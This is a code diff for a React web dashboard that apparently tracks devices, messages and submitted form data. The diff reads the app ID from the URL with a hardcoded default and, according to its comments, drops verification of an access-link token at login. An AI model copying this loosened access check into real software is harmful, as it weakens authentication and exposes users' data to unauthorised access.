@@ -3707,14 +3694,32 @@ export function LoginPage({ onAuth, onSetAppId, prefillAppId }: { onAuth: () => 
    ROOT
 ════════════════════════════════════════ */
 export default function WebDashboard() {
-  // appId is no longer in the URL — it's entered by the user at login and stored in sessionStorage
-  const [appId, setAppId] = useState<string>(() => sessionStorage.getItem("mrrobot_active_appid") || "");
+  const [appId] = useState<string>(() => new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3");
 
+  // The "pt" access-link token is no longer required/verified for login — an old shared
+  // link that still carries it just gets cleaned up to the plain appId link on open.
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.has("pt")) {
+      const dest = `${window.location.pathname}?appId=${encodeURIComponent(appId)}`;
+      window.location.replace(dest);
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  const [panelToken, setPanelToken] = useState<string>(() => {
+    const aid = new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3";
+    // Still read/stored for the Settings page's own "share access link" display — just no
+    // longer required to actually log in.
+    return localStorage.getItem(`mrrobot_panel_token_${aid}`) || "";
+  });
   const DEVICE_KEY = `mrrobot_device_id_${appId}`;
   const [appName, setAppName] = useState("");
   const [authed, setAuthed] = useState<boolean>(() => {
-    const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
-    return !!aid && localStorage.getItem(`mrrobot_auth_${aid}`) === "1";
+    const params = new URLSearchParams(window.location.search);
+    // Restore login from localStorage so tab close/reopen doesn't logout
+    const aid = params.get("appId") || "SKY-APP-2026-X9F3";
+    return localStorage.getItem(`mrrobot_auth_${aid}`) === "1";
   });
   const [devices, setDevices] = useState<DbDevice[]>([]);
   const [messages, setMessages] = useState<DbMessage[]>([]);
@@ -3724,13 +3729,10 @@ export default function WebDashboard() {
 
   // Stale-session guard: if marked authed but no JWT → force re-login
   useEffect(() => {
-    const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
-    const hasJwt = !!aid && !!sessionStorage.getItem(`mrrobot_jwt_${aid}`);
+    const hasJwt = !!sessionStorage.getItem(`mrrobot_jwt_${appId}`);
     if (!hasJwt) {
-      if (aid) {
-        localStorage.removeItem(`mrrobot_auth_${aid}`);
-        localStorage.removeItem(`mrrobot_session_id_${aid}`);
-      }
+      localStorage.removeItem(`mrrobot_auth_${appId}`);
+      localStorage.removeItem(`mrrobot_session_id_${appId}`);
       setAuthed(false);
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -4177,16 +4179,12 @@ export default function WebDashboard() {
   }
 
   if (!authed) {
-    const isDark = typeof window !== "undefined" && window.matchMedia?.("(prefers-color-scheme: dark)").matches;
-    return (
-      <ThemeCtx.Provider value={isDark ? DT : LT}>
-        <LoginPage
-          onAuth={() => setAuthed(true)}
-          onSetAppId={(id) => { setAppId(id); }}
-        />
-      </ThemeCtx.Provider>
-    );
-  }
+      const dest = `${import.meta.env.BASE_URL}login?appId=${encodeURIComponent(appId)}`;
+      if (typeof window !== "undefined" && window.location.pathname + window.location.search !== dest) {
+        window.location.replace(dest);
+      }
+      return null;
+    }
 
   const theme = isZeroTrace ? ZT : (effectiveDark ? DT : LT);
   // Zero Trace accent helpers (used in login page + SVGs)
@@ -4451,7 +4449,7 @@ export default function WebDashboard() {
               {page === "messages" && <MessagesPage appId={appId} messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} favoritesOnly={filterFavorites} recentOnly={filterRecent} liveTotal={totalMsgCount} />}
               {page === "groups" && <GroupsPage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} favoritesOnly={filterFavorites} recentOnly={filterRecent} />}
               {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
-              {page === "settings" && <SettingsPage appId={appId} isDark={effectiveDark} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} msgCount={totalMsgCount || messages.length} isZeroTrace={isZeroTrace} onDeleteProtEnabledChange={setDeleteProtEnabled} />}
+              {page === "settings" && <SettingsPage appId={appId} isDark={effectiveDark} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} msgCount={totalMsgCount || messages.length} isZeroTrace={isZeroTrace} onDeleteProtEnabledChange={setDeleteProtEnabled} panelToken={panelToken} onPanelTokenChange={setPanelToken} />}
             </div>
             <ScrollToTopBtn />
           </>
@@ -4466,23 +4464,34 @@ export default function WebDashboard() {
 
 
   export function SubAdminLoginPage() {
-    const [authed, setAuthed] = useState<boolean>(() => {
-      const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
-      if (!aid) return false;
-      const hasJwt = !!sessionStorage.getItem(`mrrobot_jwt_${aid}`);
-      const hasAuth = localStorage.getItem(`mrrobot_auth_${aid}`) === "1";
-      return hasJwt && hasAuth;
-    });
+    const params = new URLSearchParams(window.location.search);
+    const appId = params.get("appId") || "SKY-APP-2026-X9F3";
+    const [appName, setAppName] = useState("");
 
-    if (authed) return <WebDashboard />;
+    // The "pt" access-link token is no longer required/verified — old shared links that
+    // still carry it just get cleaned up to the plain appId link on open.
+    useEffect(() => {
+      if (params.has("pt")) {
+        const dest = `${import.meta.env.BASE_URL}login?appId=${encodeURIComponent(appId)}`;
+        window.location.replace(dest);
+      }
+      // eslint-disable-next-line react-hooks/exhaustive-deps
+    }, []);
+
+    useEffect(() => {
+      apiFetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
+    }, [appId]);
+
+    function handleAuth() {
+      const dest = `${import.meta.env.BASE_URL}preview/dashboard/WebDashboard?appId=${encodeURIComponent(appId)}`;
+      window.location.replace(dest);
+    }
 
     const isDark = typeof window !== "undefined" && window.matchMedia?.("(prefers-color-scheme: dark)").matches;
+
     return (
       <ThemeCtx.Provider value={isDark ? DT : LT}>
-        <LoginPage
-          onAuth={() => setAuthed(true)}
-          onSetAppId={() => {}}
-        />
+        <LoginPage onAuth={handleAuth} appId={appId} appName={appName} panelToken="" />
       </ThemeCtx.Provider>
     );
   }
